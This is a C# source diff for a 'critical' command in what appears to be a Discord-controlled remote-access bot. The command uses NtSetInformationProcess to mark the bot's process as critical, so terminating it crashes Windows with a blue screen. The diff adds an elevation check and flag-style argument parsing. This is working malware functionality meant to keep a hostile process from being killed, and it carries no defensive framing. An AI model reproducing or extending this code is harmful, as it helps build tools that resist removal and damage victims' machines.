@@ -7,7 +7,7 @@ namespace Main.Source.Bot.Commands
 {
     public class Critical : CommandBase
     {
-        [DllImport("ntdll.dll", SetLastError = true)]
+        [DllImport("ntdll.dll")]
         private static extern int NtSetInformationProcess(
             IntPtr hProcess,
             int processInformationClass,
@@ -17,17 +17,25 @@ namespace Main.Source.Bot.Commands
 
         public override string Name => "critical";
         public override string Info => "Makes the process trigger the blue screen of death when terminated";
-        public override string Use => "on | off";
+        public override string Use => "-on | -off";
 
         public override async Task Func(SocketCommandContext socket, string[] args)
         {
+            if (!Utilities.Common.IsElevated())
+            {
+                await socket.Message.ReplyAsync("Cannot run command while not elevated");
+                return;
+            }
+
             if (args.Length != 1)
             {
                 await socket.Message.ReplyAsync("Usage: " + Use);
                 return;
             }
 
-            if (args[0] == "on")
+            string arguments = string.Join(" ", args);
+
+            if (Utilities.Parser.GetFlag(arguments, "on"))
             {
                 int critical = 1;
 
@@ -40,7 +48,7 @@ namespace Main.Source.Bot.Commands
                     sizeof(int)
                 );
             }
-            else if (args[0] == "off")
+            else if (Utilities.Parser.GetFlag(arguments, "off"))
             {
                 int critical = 0;
 
